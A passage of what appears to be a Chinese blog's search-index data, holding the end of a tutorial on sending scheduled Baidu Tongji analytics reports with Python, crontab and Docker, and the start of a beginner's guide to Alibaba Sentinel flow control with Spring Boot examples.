网站概况 overview/getTimeTrendRpt # pv_count (浏览量(PV)) # visitor_count (访客数(UV)) # ip_count (IP 数) # bounce_ratio (跳出率，%) # avg_visit_time (平均访问时长，秒) # 趋势分析 trend/time/a # pv_count (浏览量(PV)) # pv_ratio (浏览量占比，%) # visit_count (访问次数) # visitor_count (访客数(UV)) # new_visitor_count (新访客数) # new_visitor_ratio (新访客比率，%) # ip_count (IP 数) # bounce_ratio (跳出率，%) # avg_visit_time (平均访问时长，秒) # avg_visit_pages (平均访问页数) # trans_count (转化次数) # trans_ratio (转化率，%) # avg_trans_cost (平均转化成本，元) # income (收益，元) # profit (利润，元) # roi (投资回报率，%)'''''' # Http 请求参数 para = { 'site_id': site_id, # 站点ID 'method': 'trend/time/a', # 趋势分析报告 'start_date': '20170316', # 所查询数据的起始日期 'end_date': '20170320', # 所查询数据的结束日期 'metrics': 'pv_count,visitor_count', # 所查询指标为PV和UV 'max_results': '0', # 返回所有条数 'gran': 'day', # 按天粒度 day/hour/week/month }'''# 查询网站概况的统计数据def queryOverviewData(): bdtj = BaiduTongji(USER_NAME, PASS_WORD, TOKEN) sites = bdtj.getsitelist() site_id = sites[0]['site_id'] today = ''.join(time.strftime(\"%Y-%m-%d\", time.localtime())) yesterday = datetime.date.today() + datetime.timedelta(-1) para = {'site_id': site_id, 'method': 'overview/getTimeTrendRpt', 'start_date': yesterday, 'end_date': today, 'metrics': 'pv_count,visitor_count,ip_count,bounce_ratio,avg_visit_time', 'max_results': '0', 'gran': 'day', } # 查询数据 data = bdtj.getdata(para) # print json.dumps(data['data'][0]['result']['items'], indent=4) # 日志 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', filename=LOG_FILE) # 打印查询结果 logging.info(json.dumps(data['data'][0]['result']['items'])) # 今日数据 today_data = data['data'][0]['result']['items'][1][1] today_date = json.dumps(data['data'][0]['result']['items'][0][1])[7:-2].replace('/','-') # 昨日数据 yesterday_data = data['data'][0]['result']['items'][1][0] yesterday_date = json.dumps(data['data'][0]['result']['items'][0][0])[7:-2].replace('/','-') # 数据格式化 str_format = ''.join(( '&lt;form&gt;' ' &lt;table&gt;', ' &lt;tr&gt;', ' &lt;th&gt;统计日期&lt;/th&gt;', ' &lt;th&gt;今天（{today_date}）&lt;/th&gt;', ' &lt;th&gt;昨天（{yesterday_date}）&lt;/th&gt;', ' &lt;/tr&gt;\\n', ' &lt;tr&gt;', ' &lt;td&gt;浏览量（PV）&lt;/td&gt;', ' &lt;td&gt;{today_pv_count} &lt;/td&gt;', ' &lt;td&gt;{yesterday_pv_count}&lt;/td&gt;', ' &lt;/tr&gt;\\n\\n', ' &lt;tr&gt;', ' &lt;td&gt;访客数（UV）&lt;/td&gt;', ' &lt;td&gt;{today_visitor_count} &lt;/td&gt;', ' &lt;td&gt;{yesterday_visitor_count}&lt;/td&gt;', ' &lt;/tr&gt;\\n\\n', ' &lt;tr&gt;', ' &lt;td&gt;IP数 &lt;/td&gt;', ' &lt;td&gt;{today_ip_count} &lt;/td&gt;', ' &lt;td&gt;{yesterday_ip_count}&lt;/td&gt;', ' &lt;/tr&gt;\\n\\n', ' &lt;tr&gt;', ' &lt;td&gt;跳出率 &lt;/td&gt;', ' &lt;td&gt;{today_bounce_ratio}% &lt;/td&gt;', ' &lt;td&gt;{yesterday_bounce_ratio}%&lt;/td&gt;', ' &lt;/tr&gt;\\n\\n', ' &lt;tr&gt;', ' &lt;td&gt;平均访问时长&lt;/td&gt;', ' &lt;td&gt;{today_avg_visit_minute}:{today_avg_visit_second} &lt;/td&gt;', ' &lt;td&gt;{yesterday_avg_visit_minute}:{yesterday_avg_visit_second}&lt;/td&gt;', ' &lt;/tr&gt;', ' &lt;/table&gt;', '&lt;/form&gt;')) report = str_format.format( today_date=today_date, today_pv_count=today_data[0], today_visitor_count=today_data[1], today_ip_count=today_data[2], today_bounce_ratio=today_data[3], today_avg_visit_minute=today_data[4]/60, today_avg_visit_second=today_data[4] % 60, yesterday_date=yesterday_date, yesterday_pv_count=yesterday_data[0], yesterday_visitor_count=yesterday_data[1], yesterday_ip_count=yesterday_data[2], yesterday_bounce_ratio=yesterday_data[3], yesterday_avg_visit_minute=yesterday_data[4]/60, yesterday_avg_visit_second=yesterday_data[4] % 60) # 发送消息 title = ''.join(('百度统计报表（', time.strftime(\"%m-%d %H:%M\", time.localtime()), '）')) msgResp = sendMessage(title, report) msgResult = json.loads(msgResp) if msgResult['errno'] == 0: logging.info('message send successed!') else: logging.error(''.join(('message send faild: ', msgResult)))if __name__ == '__main__': queryOverviewData() Crontab 定时任务Linux 系统环境下，配合 Python 脚本 + Crontab 定时任务，即可定时发送统计报表信息。 12# 每天晚上23时59分发送统计报表信息59 23 * * * /usr/bin/python2 /usr/local/baidu-push/baidu_tongji.py 脚本输出的日志信息1234$ cat /tmp/baidu_tongji_report.log2020-01-17 22:15:10,563 - www - INFO - [[[\"2020/01/16\"], [\"2020/01/17\"]], [[218, 65, 65, 76.19, 295], [100, 63, 62, 80.88, 397]], [], []]2020-01-17 22:15:15,737 - www - INFO - message send successed! Docker 一键部署统计服务 Dockerfile 的内容如下，构建生成 Docker 镜像后，使用命令直接启动 Docker 镜像即可。 使用命令直接启动 Docker 镜像时，需要通过 -v 参数挂载对应的文件（如下） a) 将宿主机里的 RSA 公钥文件挂载到 Docker 容器内的 /usr/local/python_scripts/api_pub.key 位置 b) 将宿主机里的 Python 脚本文件挂载到 Docker 容器内的 /usr/local/python_scripts/baidu_tongji.py 位置 123456789101112131415161718192021222324252627282930313233343536from augurproject/python2-and-3MAINTAINER clay&lt;656418510@qq.com&gt;RUN mkdir -p /tmp/baiduRUN touch /var/log/cron.logRUN mkdir -p /usr/local/python_scriptsENV workpath /usr/local/python_scriptsWORKDIR $workpathRUN echo \"Asia/Shanghai\" &gt; /etc/timezoneRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo \"deb http://mirrors.163.com/debian/ stretch main non-free contrib\" &gt; /etc/apt/sources.listRUN echo \"deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb-src http://mirrors.163.com/debian/ stretch main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install python-rsa python-requests cron rsyslog vim htop net-tools telnet apt-utils tree wget curl git make gccRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveRUN sed -i \"s/#cron./cron./g\" /etc/rsyslog.confRUN echo \"59 23 * * * root /usr/bin/python2 /usr/local/python_scripts/baidu_tongji.py\" &gt;&gt; /etc/crontabCMD service rsyslog start &amp;&amp; service cron start &amp;&amp; tail -f -n 20 /var/log/cron.log 若通过 Docker-Compose 来管理 Docker 镜像，那么 YML 配置文件的内容如下： 12345678910111213version: '3.5'services: baidu-push: image: clay/baidu-push:1.0 container_name: hexo-baidu-push restart: always environment: TZ: 'Asia/Shanghai' volumes: - /usr/local/baidu-push/logs:/tmp/baidu - /usr/local/baidu-push/api_pub.key:/usr/local/python_scripts/api_pub.key - /usr/local/baidu-push/baidu_tongji.py:/usr/local/python_scripts/baidu_tongji.py 数据卷挂载： /usr/local/baidu-push/logs：宿主机里的日志目录 /usr/local/baidu-push/api_pub.key：宿主机里 RSA 公钥文件的路径 /usr/local/baidu-push/baidu_tongji.py：宿主机里 Python 脚本文件的路径 移动端的展示效果 参考资料 yelord/baidutongji zephery/baidutongji var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"python"},{title:"Sentinel 入门教程 - 基础篇",url:"/posts/8facd1ee.html",text:'前言本文针对 Sentinel 1.8.0 及以上版本编写，特别说明除外。由于 1.8.0 版本对熔断降级特性进行了全新的改进升级，建议使用最新版本以更好地利用熔断降级的能力。 流量控制与熔断降级流量控制概述拿旅游景点举个示例，旅游景点通常都会有最大的接待量，不可能无限制的放游客进入，比如故宫每天只卖八万张票，超过八万的游客，无法买票进入，因为如果超过八万人，景点的工作人员可能就忙不过来，过于拥挤的景点也会影响游客的体验和心情，并且还会有安全隐患；只卖 N 张票，这就是一种限流的手段。流量控制在网络传输中是一个常用的概念，它用于调整网络包的发送数据。在网络传输时，任意时间到来的请求往往是随机不可控的，而系统的处理能力是有限的，因此需要根据系统的处理能力对流量进行控制。 熔断降级概述在调用系统的时候，如果调用链路中的某个资源出现了不稳定或者不可用，最终会导致请求发生积压（如下图），而熔断降级就可以解决这个问题。所谓的熔断降级就是当检测到调用链路中某个资源出现不稳定的表现，例如请求响应时间过长或者异常比例升高的时候，则对这个资源的调用进行限制，让请求快速失败，避免影响到其他的资源而导致级联故障（服务雪崩）。 流量控制与熔断降级实现方案Hystrix Hystrix 是由 Netflix 开源的一个针对分布式系统容错处理的开源组件，2011 - 2012 年相继诞生和成熟，在 2018 年 11 月 20 日之后已经停止维护，最后一个正式版本为 1.5.18。Hystrix 单词意为 “豪猪”，浑身有刺保护自己，Hystrix 就是这样一个用来捍卫应用程序健康的利器。进一步说，Hystrix 是一个延迟和容错库，用在隔离远程系统、服务和第三方库，阻止级连故障，在复杂的分布式系统中实现恢复能力，以提高分布式系统的弹性。 Sentinel Sentinel 是阿里巴巴出品的面向分布式服务架构的轻量级流量控制组件，主要以流量为入点，从限流、流量整形、熔断降级、系统负载保护等多个维度来保障微服务的稳定性。 Resilience4j Resilience4j 是一款轻量级，易于使用的容错库，其灵感来自于 Netflix Hystrix，但是专为 Java 8 和函数式编程而设计。轻量级，因为库只使用了 Vavr，它没有任何其他外部依赖下。相比之下，Netflix Hystrix 对 Archaius 具有编译依赖性，Archaius 具有更多的外部库依赖性，例如 Guava 和 Apache Commons Configuration。在 Spring Cloud Greenwich 版中，Spring 官方推荐使用 Resilience4j 替代 Hystrix。 开源实现方案对比附：Sentinel 对比 Hystrix 详解 Sentinel 介绍Sentinel 简介Sentinel 是阿里巴巴出品的面向分布式服务架构的轻量级流量控制组件，主要以流量为入点，从限流、流量整形、熔断降级、系统负载保护等多个维度来保障微服务的稳定性，更多介绍可参考：Sentinel 项目、Sentinel 官方中文文档 Sentinel 历史2012 年，Sentinel 诞生，主要功能为入口流量控制2013 - 2017 年，Sentinel 在阿里巴巴集团内部迅速发展，成为基础技术模块，覆盖了所有的核心场景，Sentinel 也因此积累了大量的流量归整场景以及生产实践2018 年，Sentinel 开源，并持续演进2019 年 Sentinel 朝着多语言扩展的方向不断探索，推出 C++ 原生版本，同时针对 Service Mesh 场景也推出了 Envoy 集群流量控制支持，以解决 Service Mesh 架构下多语言限流的问题2020 年，推出 Sentinel 的 Go 原生版本，继续朝着云原生的方向演进，同时已覆盖微服务、API Gateway 和 Service Mesh 三大板块的核心生态 Sentinel 组成 核心库：主要指 Java 客户端，不依赖任何框架 / 库，能够运行于 Java 7 及以上的版本的运行环境，同时对 Dubbo、Spring Cloud、Spring Cloud Alibaba 等框架也有较好的支持 控制台：控制台主要负责管理推送规则、监控、集群限流分配管理、机器发现等 Sentinel 优势 友好的控制面板，支持实时监控 多种限流。支持 QPS 限流，线程数限流，多种限流策略，如：直接拒绝，冷启动，匀速模式（漏斗） 多种降级模式，支持按平均返回时间降级，按多种异常数降级，按异常比率降级 方便扩展开发，支持 SPI 模式对 chain 进行扩展 支持链路的关联，按链路统计限流，系统保护，热门资源保护等等 Sentinel 特点 丰富的应用场景：Sentinel 承接了阿里巴巴近 10 年的双十一大促流量的核心场景，例如秒杀（即突发流量控制在系统容量可以承受的范围）、消息削峰填谷、集群流量控制、实时熔断下游不可用应用等 广泛的开源生态：Sentinel 提供开箱即用的与其它开源框架 / 库的整合模块，例如与 Spring Cloud、Dubbo、gRPC 的整合，只需要引入相应的依赖并进行简单的配置即可快速地接入 Sentinel 完备的实时监控：Sentinel 同时提供实时的监控功能。开发者可以在控制台中看到接入应用的单台机器秒级数据，甚至 500 台以下规模的集群的汇总运行情况 完善的 SPI 扩展点：Sentinel 提供简单易用、完善的 SPI 扩展接口。可以通过实现扩展接口来快速地定制逻辑，例如定制规则管理、适配动态数据源等 Sentinel 开源生态 AHAS Sentinel 控制台AHAS Sentinel 简介AHAS Sentinel 是 Sentinel 的阿里云上版本（商业版），提供企业级的高可用防护服务，包括： 可靠的实时监控和历史秒级监控数据查询，包含 QPS、RT、load、CPU 使用率等指标，支持按照调用类型分类，支持同比 / 环比展示 热力图概览，可以快速定位不稳定的机器 动态规则管理 / 推送，无需自行配置外部数据源 告警中心（触发流控、CPU 利用率高等事件） 全自动托管、高可用的集群流量控制 针对 Istio/Envoy 集群的 Mesh 高可用防护 Nginx 网关流控 AHAS Sentinel 控制台体验这里只是简单使用 AHAS Sentinel 官方提供的 Demo 包接入到 AHAS Sentinel 控制台，若希望将已有的 Sentinel 项目接入到 AHAS Sentinel 控制台，具体可参考 Sentinel 官方文档。 阿里云开通 AHAS 打开 AHAS 产品主页 在页面右上角单击登录 在页面上输入您的阿里云账号和密码，并单击登录 在产品主页上单击申请免费开通，然后在云产品开通页页面上勾选” 我已阅读并同意《应用高可用服务服务协议》”，并单击立即开通 接入新应用 若应用运行在非阿里云 ECS 环境或本地，需要在左上角选择切换公网环境 获取 Demo 包 点击控制台左侧菜单栏的 应用防护，找到 Tab 页面选择 JAVA 语言 -&gt; 体验 Demo，然后根据页面提示下载 Demo 包 启动 Demo 应用 公网和阿里云经典网络环境下，需要额外指定 License 用于身份校验，VPC 专有网络无需配置 License 12# 启动命令$ java -Dahas.namespace=default -Dproject.name=AppName -Dahas.license=xxxxxxxxxxxxx -jar ahas-sentinel-sdk-demo.jar 等待一会，AHAS Sentinel 控制台就会显示相关监控数据 Sentinel 基础Sentinel 基本概念资源 资源是 Sentinel 的关键概念。它可以是 Java 应用程序中的任何内容，例如，由应用程序自身提供的服务，或由应用程序调用的其它应用提供的服务，甚至可以是一段代码。只要通过 Sentinel API 定义的代码，就是资源，能够被 Sentinel 保护起来。大部分情况下，可以使用方法签名，URL，甚至服务名称作为资源名来标示资源。 规则 围绕资源的实时状态设定的规则，可以包括流量控制规则、熔断降级规则以及系统保护规则。所有规则可以动态实时调整。 Sentinel 设计理念流量控制设计理念Sentinel 流量控制有以下几个角度: 运行指标，例如 QPS、线程池、系统负载等 控制的效果，例如直接限流、冷启动、排队等 资源的调用关系，例如资源的调用链路，资源和资源之间的关系 熔断降级设计理念Sentinel 和 Hystrix 的原则是一致的，即当检测到调用链路中某个资源出现不稳定的表现，例如请求响应时间过长或异常比例升高的时候，则对这个资源的调用进行限制，让请求快速失败，避免影响到其它的资源而导致级联故障。但在限制的手段上，Sentinel 和 Hystrix 采取了完全不一样的方法。Hystrix 通过线程池隔离的方式，来对依赖（在 Sentinel 的概念中对应资源）进行了隔离。这样做的好处是资源和资源之间做到了最彻底的隔离。缺点是除了增加了线程切换的成本（过多的线程池导致线程数目过多），还需要预先给各个资源做线程池大小的分配，并且对于一些使用了 ThreadLocal 的场景来说会有问题（如 Spring 的事务）。Sentinel 对这个问题采取了以下两种手段来解决： 通过并发线程数进行限制 和资源池隔离的方法不同，Sentinel 通过限制资源并发线程的数量，来减少不稳定资源对其它资源的影响。这样不但没有线程切换的损耗，也不需要您预先分配线程池的大小。当某个资源出现不稳定的情况下，例如响应时间变长，对资源的直接影响就是会造成线程数的逐步堆积。当线程数在特定资源上堆积到一定的数量之后，对该资源的新请求就会被拒绝，堆积的线程完成任务后才开始继续接收请求。 针对慢调用和异常对资源进行降级 除了对并发线程数进行控制以外，Sentinel 还可以根据响应时间和异常等不稳定因素来快速对不稳定的调用进行熔断。当依赖的资源出现响应时间过长后，所有对该资源的访问都会被直接拒绝，直到过了指定的时间窗口之后才重新渐进式地恢复。 系统自适应保护理念Sentinel 同时提供系统维度的自适应保护能力。防止雪崩，是系统防护中重要的一环。当系统负载较高的时候，如果还持续让请求进入，可能会导致系统崩溃，无法响应。在集群环境下，网络负载均衡会把本应这台机器承载的流量转发到其它的机器上去。如果这个时候其它的机器也处在一个边缘状态的时候，这个增加的流量就会导致这台机器也崩溃，最后导致整个集群不可用。针对这个情况，Sentinel 提供了对应的保护机制，让系统的入口流量和系统的负载达到一个平衡，保证系统在能力范围之内处理最多的请求。 Sentinel 流量控制入门案例版本说明本案例使用的 Spring Boot 版本为 2.1.4.RELEASE，Sentinel 版本为 1.8.0，点击下载完整的案例代码。 本地 Sentinel 控制台搭建Sentinel 提供了一个轻量级的开源控制台，它提供机器发现以及健康状况管理、实时监控（单机和集群），规则管理和推送功能 下载 Sentinel 控制台Sentinel 控制台下载有两种方式，一种是直接下载编译好的 Release 版本程序包，另一种是下载 Sentinel 控制台的工程源码，在本地打包后启动，这里采用第一种方式 12# 下载命令$ wget https://github.com/alibaba/Sentinel/releases/download/v1.8.0/sentinel-dashboard-1.8.0.jar 启动 Sentinel 控制台启动 Sentinel 控制台需要依赖 JDK 版本为 1.8 及以上版本，使用以下命令启动控制台： 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar 浏览器访问 http://127.0.0.1:9000，默认登录的用户名和密码为：sentinel/sentinel Sentinel 控制台启动参数说明Sentinel 控制台启动时，可配置的 JVM 参数如下： -Dserver.port 指定 Sentinel 控制台监听的端口 -Dproject.name，设置应用在 Sentinel 控制台中显示的名称 -Dcsp.sentinel.dashboard.server 设置应用需要连接到的 Sentinel 控制台的主机地址和端口号 -Dsentinel.dashboard.auth.password=123456 用于指定控制台的登录密码为 123456 -Dsentinel.dashboard.auth.username=sentinel 用于指定控制台的登录用户名为 sentinel -Dserver.servlet.session.timeout=7200 用于指定 Spring Boot 服务端 session 的过期时间，如 7200 表示 7200 秒；60m 表示 60 分钟，默认为 30 分钟 特别注意：Sentinel 控制台启动时，若在 JVM 参数中添加了 -Dproject.name 与 -Dcsp.sentinel.dashboard.server，那么 Sentinel 控制台自身也可以注册到其他 Sentinel 控制台中，Sentinel 控制台甚至可以自己监控自己，启动配置示例如下： 1$ java -Dserver.port=9000 -Dcsp.sentinel.dashboard.server=127.0.0.1:9000 -Dproject.name=sentinel-dashboard -jar sentinel-dashboard-1.8.0.jar 此时浏览器访问 http://127.0.0.1:9000，可以发现控制台会多出一个 sentinel-dashboard 节点： 构建 Sentinel 本地应用引入 Maven 依赖由于需要将应用接入到 Sentinel 控制台，因此引入了 sentinel-transport-simple-http 依赖 12345678910111213141516171819202122232425262728293031323334353637383940&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.4.RELEASE&lt;/version&gt; &lt;relativePath/&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;sentinel.version&gt;1.8.0&lt;/sentinel.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-core&lt;/artifactId&gt; &lt;version&gt;${sentinel.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-transport-simple-http&lt;/artifactId&gt; &lt;version&gt;${sentinel.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 添加 Java SDK 代码123456789101112131415161718192021222324252627282930313233343536373839404142@RestControllerpublic class HelloController { /** * 资源名称 */ private static final String RESOURCE_NAME = "Hello"; @GetMapping("/hello") public String hello() { // 使用流控规则 try (Entry entry = SphU.entry(RESOURCE_NAME)) { // 被保护的资源 return "Hello Sentinel!"; } catch (Exception e) { // 被限流 e.printStackTrace(); return "系统繁忙，请稍后 ..."; } } /** * 当前类的构造函数执行之后执行此方法 */ @PostConstruct public void initFlowRules() { // 创建存放流控规则的集合 List&lt;FlowRule&gt; rules = new ArrayList&lt;&gt;(); // 创建流控规则 FlowRule rule = new FlowRule(); // 定义资源，表示Sentinel会对哪个资源生效 rule.setResource(RESOURCE_NAME); // 定义流控规则的类型 rule.setGrade(RuleConstant.FLOW_GRADE_QPS); // 定义QPS每秒能通过的请求数 rule.setCount(2); // 将流控规则存放在集合中 rules.add(rule); // 加载流控规则 FlowRuleManager.loadRules(rules); }} 1234567@SpringBootApplicationpublic class SentinelApplication { public static void main(String[] args) { SpringApplication.run(SentinelApplication.class, args); }} 将应用连接到 Sentinel 控制台若应用程序需要连接到 Sentinel 控制台， Sentinel 提供如下两种常用的配置方式，具体可参考 Sentinel 官方文档中的启动配置项 JVM -D 参数方式 properties 文件方式（1.7.0 版本开始支持） 这里采用添加 JVM 参数的启动方式，即启动应用时加入以下 JVM 参数： -Dproject.name=sentinel-demo，设置本地应用在 Sentinel 控制台中显示的名称 -Dcsp.sentinel.dashboard.server=127.0.0.1:9000，设置应用需要连接到的 Sentinel 控制台的主机地址和端口号 或者将 JVM 参数添加到 IDEA Configuration 里的 VM options 中： 测试代码 1）启动本地的 Sentinel 控制台，命令如下： 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar 2）在 Spring Boot 应用的 JVM 参数中配置 Sentinel 控制台，然后启动应用，若控制台输出以下日志信息，则说明 Sentinel 加载成功 1234INFO: Sentinel log output type is: fileINFO: Sentinel log charset is: utf-8INFO: Sentinel log base directory is: /root/logs/csp/INFO: Sentinel log name use pid is: false 特别注意：当代码里硬编码了流控规则（即使用 Java API 定义和加载流控规则）时，IDE 的控制台才会在应用启动时输出上面 Sentinel 相关的日志信息 3）浏览器访问 http://127.0.0.:9090，查看 Sentinel 控制台的监控信息；这里需要先手动调用一次 http://127.0.0.1:8080/hello 接口，Sentinel 控制台才会显示监控数据 4）浏览器访问 http://127.0.0.1:8080/hello，当快速刷新页面时，请求的响应结果变为 系统繁忙，请稍后 ...，则说明 Sentinel 的流控规则生效了 动态配置 Sentinel 的流控规则在上述案例中，将 Sentinel 的流控规则硬编码在 Java 代码里，但在实际的企业项目开发中，这种方式不推荐使用。在日常测试和演示中，一般都会在 Sentinel 控制台里动态配置流控规则，因为这样使用起来比较灵活。首先，将上述案例中添加 Sentinel 流控规则的代码注释掉（示例代码如下），然后在 Spring Boot 应用的 JVM 参数中配置 Sentinel 控制台。重新启动应用后，此时打印的启动日志信息不会再有 Sentinel 相关的内容。特别注意，默认情况下通过 Sentinel 控制台动态添加的规则配置是存放在内存里的，即动态添加的规则配置在 Sentinel 控制台应用重启后会失效。 123456789101112131415161718192021@RestControllerpublic class HelloController { /** * 资源名称 */ private static final String RESOURCE_NAME = "Hello"; @GetMapping("/hello") public String hello() { // 使用流控规则 try (Entry entry = SphU.entry(RESOURCE_NAME)) { // 被保护的资源 return "Hello Sentinel!"; } catch (Exception e) { // 被限流 e.printStackTrace(); return "系统繁忙，请稍后 ..."; } }} 浏览器手动调用一次 http://127.0.0.1:8080/hello 接口，然后打开 Sentinel 控制台，动态添加流控规则，表单里的资源名必须与 Java 代码里指定的资源名一致，如下图所示： 浏览器再次访问 http://127.0.0.1:8080/hello，当快速刷新页面时，请求的响应结果变为 系统繁忙，请稍后 ...，则说明动态配置的 Sentinel 流控规则生效了 Sentinel 定义资源的方式资源是 Sentinel 的关键概念，它可以是 Java 应用程序中的任何内容，例如，由应用程序自身提供的服务，或由应用程序调用的其它应用提供的服务，甚至可以是一段代码。使用 Sentinel 来进行资源保护，主要分为两个步骤，包括定义资源和定义规则。先把可能需要保护的资源定义好，之后再配置规则。在编码的时候，只需要考虑这个代码是否需要保护，如果需要保护，就可以将之定义为一个资源。 Sentinel 除了基本的定义资源的方式之外，还有其他定义资源的方式，具体如下： 抛出异常的方式定义资源 返回布尔值方式定义资源 异步调用支持 注解方式定义资源 主流框架的默认适配 版本声明本案例使用的 Spring Boot 版本为 2.1.4.RELEASE，Spring Cloud Alibaba Sentinel 版本为 2.1.3.RELEASE，Sentinel 1.8.0。以下代码，默认都通过 Sentinel 控制台动态配置流控规则来测试，具体不再累述，点击下载完整的案例代码。 添加 Maven 依赖1234567891011121314151617181920212223242526&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.4.RELEASE&lt;/version&gt; &lt;relativePath/&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 如果不需要使用注解的方式来定义 Sentinel 资源，一般只需要引入以下两个依赖即可，此时启动应用时需要添加 JVM 参数来连接 Sentinel 控制台。否则需要引入 spring-cloud-starter-alibaba-sentinel 依赖，才能让 @SentinelResource 注解生效。 123456789101112&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-core&lt;/artifactId&gt; &lt;version&gt;1.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-transport-simple-http&lt;/artifactId&gt; &lt;version&gt;1.8.0&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 配置 application.yml12345678910server: port: 8080spring: application: name: sentinel-resource-define-demo cloud: sentinel: transport: dashboard: 127.0.0.1:9000 抛出异常的方式定义资源Sentinel 的 SphU 包含了 try-catch 风格的 API。用这种方式，当资源发生了限流之后就会抛出 BlockException 异常。这个时候可以捕获异常，进行限流之后的逻辑处理，而在上述的入门案例中就使用了此种方式进行定义资源，关键代码如下： 123456789101112131415161718192021@RestControllerpublic class TestController { /** * 资源名称 */ private static final String RESOURCE_NAME = "Hello"; @GetMapping("/hello") public String hello() { // 使用流控规则 try (Entry entry = SphU.entry(RESOURCE_NAME)) { // 被保护的资源 return "Hello Sentinel!"; } catch (Exception e) { // 被限流 e.printStackTrace(); return "系统繁忙，请稍后 ..."; } }} 返回布尔值方式定义资源Sentinel 的 SphO 提供 if-else 风格的 API，用这种方式，当资源发生了限流之后就会返回 false，这个时候可以根据返回值，进行限流之后的逻辑处理。 123456789101112131415161718192021222324252627@RestControllerpublic class TestBooleanController { /** * 资源名称 */ private static final String RESOURCE_NAME = "Boolean"; @GetMapping("/boolean") public boolean hello() { // 使用流控规则 if (SphO.entry(RESOURCE_NAME)) { // 被保护的资源 try { System.out.println("Hello Sentinel!"); return true; } finally { // 限流的出口 SphO.exit(); } } else { // 被限流 System.out.println("系统繁忙，请稍后 ..."); return false; } }} 特别注意：SphO.entry() 需要与 SphO.exit() 方法成对出现，否则会导致调用链记录异常，抛出 ErrorEntryFreeException 异常。 异步调用方式定义资源Sentinel 支持异步调用链路的统计，在异步调用中，需要通过 SphU.asyncEntry() 方法定义资源，并在需要异步的回调函数中调用 exit() 方法。 1234567891011/** * @EnableAsync 启用Spring的异步调用支持 */@SpringBootApplication@EnableAsyncpublic class SentinelApplication { public static void main(String[] args) { SpringApplication.run(SentinelApplication.class, args); }} 